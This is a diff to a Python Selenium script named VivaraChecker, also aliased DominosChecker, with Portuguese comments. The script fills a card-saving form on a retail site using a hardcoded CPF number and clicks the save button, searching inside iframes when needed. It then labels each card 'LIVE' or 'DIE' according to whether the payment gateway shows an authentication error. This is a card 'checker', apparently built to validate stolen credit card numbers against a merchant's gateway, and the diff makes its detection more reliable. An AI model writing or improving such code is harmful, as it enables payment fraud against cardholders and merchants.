@@ -158,15 +158,23 @@ class VivaraChecker:
             fill_field("documentType", "CPF")
             fill_field("document", "84830336072")
             
-            # 5. Salvar
-            xpath_save = "//button[@type='submit'] | //button[contains(translate(., 'SALVAR NOVO CARTÃO', 'salvar novo cartão'), 'salvar novo cartão')]"
+                        # ==================== 5. SALVAR CARTÃO ====================
+            xpath_save = "//button[@type='submit'] | //button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'salvar novo cartão')]"
+
+            print("[Vivara] Tentando clicar no botão Salvar...")
             save_clicked = False
+
             try:
-                btn_salvar = WebDriverWait(driver, 40).until(EC.element_to_be_clickable((By.XPATH, xpath_save)))
-                time.sleep(6)
+                btn_salvar = WebDriverWait(driver, 20).until(
+                    EC.element_to_be_clickable((By.XPATH, xpath_save))
+                )
+                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn_salvar)
+                time.sleep(1.5)
                 driver.execute_script("arguments[0].click();", btn_salvar)
                 save_clicked = True
+                print("[Vivara] ✅ Botão Salvar clicado com sucesso")
             except:
+                # Tentativa em iframes
                 driver.switch_to.default_content()
                 iframes = driver.find_elements(By.TAG_NAME, "iframe")
                 for iframe in iframes:
@@ -174,53 +182,73 @@ class VivaraChecker:
                         driver.switch_to.frame(iframe)
                         btns = driver.find_elements(By.XPATH, xpath_save)
                         if btns:
+                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btns[0])
+                            time.sleep(1)
                             driver.execute_script("arguments[0].click();", btns[0])
                             save_clicked = True
+                            print("[Vivara] ✅ Botão Salvar clicado (dentro de iframe)")
                             break
-                    except: pass
+                    except:
+                        pass
                     driver.switch_to.default_content()
-            
-            if not save_clicked: return "DIE: Botão Salvar não encontrado"
 
-            # 6. Verificação LIVE/DIE
+            if not save_clicked:
+                return "DIE: Botão Salvar não encontrado"
+
+            # ==================== 6. AGUARDAR RESPOSTA (VERSÃO ROBUSTA) ====================
             error_msg = "Falha ao autenticar o cartão. Verifique os dados do cartão e tente novamente."
-            start_check = time.time()
-            while time.time() - start_check < 35:
-                if error_msg in driver.page_source:
-                    return "DIE"
-                
-                # Check iframes for error
-                driver.switch_to.default_content()
-                iframes = driver.find_elements(By.TAG_NAME, "iframe")
-                found_error_iframe = False
-                for iframe in iframes:
-                    try:
-                        driver.switch_to.frame(iframe)
-                        if error_msg in driver.page_source:
-                            found_error_iframe = True
-                            break
-                    except: pass
-                    driver.switch_to.default_content()
-                
-                if found_error_iframe: return "DIE"
-                
-                # If form disappeared and no error, LIVE
+            start_time = time.time()
+            max_wait = 40
+
+            print("[Vivara] Aguardando resposta do gateway...")
+
+            while time.time() - start_time < max_wait:
                 try:
-                    num_fields = driver.find_elements(By.NAME, "cc-number")
-                    if not num_fields or not num_fields[0].is_displayed():
-                        time.sleep(0.5)
-                        # Re-check error
-                        if error_msg not in driver.page_source:
-                            return "LIVE"
-                except: pass
-                time.sleep(1)
-            
+                    current_page = driver.page_source
+
+                    # === ERRO DETECTADO ===
+                    if error_msg in current_page:
+                        print("[Vivara] ❌ Mensagem de erro encontrada → DIE")
+                        return "DIE"
+
+                    # === VERIFICAÇÃO EM IFRAMES ===
+                    driver.switch_to.default_content()
+                    for iframe in driver.find_elements(By.TAG_NAME, "iframe"):
+                        try:
+                            driver.switch_to.frame(iframe)
+                            if error_msg in driver.page_source:
+                                driver.switch_to.default_content()
+                                print("[Vivara] ❌ Erro encontrado em iframe → DIE")
+                                return "DIE"
+                        except:
+                            pass
+                        driver.switch_to.default_content()
+
+                    # === SE PASSOU 6 SEGUNDOS SEM ERRO → LIVE ===
+                    if (time.time() - start_time) >= 6:
+                        print(f"[Vivara] ✅ Nenhum erro após {int(time.time() - start_time)}s → LIVE")
+                        return "LIVE"
+
+                except Exception as e:
+                    # Se der erro (ex: página recarregou, driver perdeu referência)
+                    print(f"[Vivara] Aviso durante espera: {type(e).__name__}")
+                    time.sleep(2)
+                    continue
+
+                time.sleep(1.5)
+
+            # Timeout sem erro = LIVE
+            print("[Vivara] Timeout sem mensagem de erro → LIVE")
             return "LIVE"
 
         except Exception as e:
+            print(f"[Vivara] Erro geral no test_card: {type(e).__name__} - {e}")
             return "DIE"
         finally:
-            driver.quit()
+            try:
+                driver.quit()
+            except:
+                pass
 
 # Alias para compatibilidade com versões anteriores
 DominosChecker = VivaraChecker
